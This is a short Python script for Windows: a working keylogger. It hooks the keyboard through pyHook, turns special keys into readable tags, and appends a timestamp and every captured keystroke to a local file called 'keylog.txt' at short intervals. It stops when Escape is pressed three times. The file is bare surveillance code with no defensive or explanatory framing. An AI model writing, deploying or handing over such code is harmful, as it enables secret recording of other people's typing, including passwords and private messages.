import pythoncom
import pyHook
import datetime
import time
import sys
import os

string = ""
t0 = time.time()
keymap = {
    "Space":" ",
    "Back":"<Backspace>",
    "Return":"<Enter>",
    "Up":"<Up>",
    "Down":"<Down>",
    "Left":"<Left>",
    "Right":"<Right>",
    "Escape":"<ESC>",
    "Lshift":"<Shift>",
    "Rshift":"<Shift>",
    "Oem_Period":".",
    "Oem_Comma":",",
    "Oem_7":"#",
    "Lcontrol":"<CTRL>",
    "Delete":"<DEL>",
    "Tab":"<TAB>",
    "Capital":"<CAPS>",
    "Oem_2":"/",
    "Oem_1":";",
    "Lwin":"<WIN>",
    "Rmenu":"<ALT>",
    "Lmenu":"<ALT>"
}

maxTime = None # if max = None, unlimited
saveInterval = 0.2

def keypressed(event):
    global string
    string += keymap.get(str(event.GetKey()),str(event.GetKey()))
    return True 

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()

with open("keylog.txt","a+") as f:
    while True:
        try:
            t1 = time.time()
            pythoncom.PumpWaitingMessages()
            
            if not int(t1-t0) % (saveInterval*60) and int(t1-t0) and string:
                f.write(f"[INTERVAL SAVE] {str(datetime.datetime.now()).split('.')[0]}: {f.read()}{string}\n\n")
                string = ""

            elif keymap["Escape"]*3 in string or (maxTime is not None and t1-t0 >= maxTime * 60):
                break

        except Exception as e:
            print(e)
        
    f.write(f"[MANUAL SAVE] {str(datetime.datetime.now()).split('.')[0]}: {f.read()}{string[:-len(keymap['Escape'])*3]}\n\n")
    f.close()
    sys.exit()
